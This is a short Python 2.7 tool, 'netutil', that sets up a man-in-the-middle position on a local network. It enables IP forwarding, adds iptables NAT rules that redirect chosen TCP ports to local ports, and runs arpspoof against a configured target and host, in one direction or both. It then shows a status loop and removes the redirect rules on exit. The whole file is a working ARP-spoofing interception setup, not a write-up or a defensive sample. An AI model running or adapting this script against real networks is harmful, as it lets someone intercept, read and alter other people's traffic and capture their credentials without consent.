#!/usr/bin/python2.7
import os
import time
import subprocess
import config


configstr = ''
for i in config.netutils_config.__dict__ :
    if i[0] == '_':
        continue
    print '[c]',i,config.netutils_config.__dict__[i]
    configstr += '[c] %s : %s\n'%(i,config.netutils_config.__dict__[i])
    vars()[i] = config.netutils_config.__dict__[i]


##portforward = 'iptables -t nat -A PREROUTING -p udp --dport %d -j REDIRECT --to-ports %d'%(8053,18053)
#os.system(portforward)

if hasattr(config.netutils_config,'twrecycle'):
    if twrecycle:
        twrecycle = "echo '1' > /proc/sys/net/ipv4/tcp_tw_recycle"
        os.system(twrecycle)


if ipforward:
    ipforward = "echo '1' > /proc/sys/net/ipv4/ip_forward"
    os.system(ipforward)


portr = []
pp = []
for i in port_redirect :
    if i != -1:
        portr.append( 'iptables -t nat -A PREROUTING -p tcp --dport %d -j REDIRECT --to-ports %d'%(i,port_redirect[i]) )
        pp.append(subprocess.Popen(portr[-1],stderr=subprocess.PIPE, shell=1))
        #os.system(portr[-1])

if arpspoofr :
    arpspoofr = 'arpspoof -r -i %s -t %s %s'%(interface,targetip,hostip)
    p = subprocess.Popen(arpspoofr,stderr=subprocess.PIPE, shell=1)

if hasattr(config.netutils_config,'arpspoof2'):
    if arpspoof2 :
        arpspoof2 = 'arpspoof -i %s -t %s %s'%(interface,targetip,hostip)
        arpspoof1 = 'arpspoof -i %s -t %s %s'%(interface,hostip,targetip)
        p2 = subprocess.Popen(arpspoof2,stderr=subprocess.PIPE,shell=1)
        p1 = subprocess.Popen(arpspoof1,stderr=subprocess.PIPE,shell=1)


def run():
    global twrecycle

    j = 0
    try :
        while 1:
            if j >= 10:
                j = 0
            j += 1
            os.system('clear')
            print '-- netutil\n'
            print configstr
            print ''
            print time.ctime(), '#' * j
            print '------------------------------\n',

            if len(portr) != 0:
                for i in range(len(portr)):
                    print '>',portr[i]
                    err =  pp[i].stderr.readline()
                    if err:
                        print err
                    loc = err.find('Permission denied')
                    if loc != -1:
                        return

            if arpspoofr :
                print '>',arpspoofr
                err =  p.stderr.readline()
                if err[:9] == 'arpspoof:' :
                    print err
                    return

            if arpspoof2 :
                print '>',arpspoof1
                print '>',arpspoof2
                err =  p2.stderr.readline()
                if err[:9] == 'arpspoof:' :
                    print err
                    return

            #print 'redirect:',port_redirect
            
            if twrecycle :
                print '>',twrecycle

            print ''

            time.sleep(1)

    except KeyboardInterrupt:
            #os.system("echo '0' > /proc/sys/net/ipv4/ip_forward")
            #os.system('iptables -t nat -F PREROUTING')
            for i in port_redirect:
                if i == -1:
                    continue
                portd = 'iptables -t nat -D PREROUTING -p tcp --dport %d -j REDIRECT --to-ports %d'%(i,port_redirect[i])
                print portd
                os.system(portd)

            if twrecycle:
                twrecycle = "echo '0' >/proc/sys/net/ipv4/tcp_tw_recycle"
                os.system(twrecycle)
    except Exception,e:
        print e


if __name__ == '__main__' :
    run()
